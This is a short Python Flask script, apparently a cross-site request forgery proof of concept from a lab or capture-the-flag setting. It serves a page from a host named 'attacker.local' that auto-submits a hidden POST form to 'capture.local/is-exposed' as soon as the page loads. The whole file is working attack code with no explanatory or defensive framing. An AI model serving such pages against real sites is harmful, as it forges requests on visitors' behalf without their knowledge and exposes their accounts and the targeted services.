from flask import Flask, render_template_string

app = Flask("pwnc")


@app.route("/")
def hello():
    # auto-submit on page load
    html_form = """<html>
    <body onload="document.getElementById('leakForm').submit();">
        <form id="leakForm" action="http://capture.local/is-exposed" method="POST" />
    </body>
</html>
"""
    return render_template_string(html_form)


app.run("attacker.local", 9999)
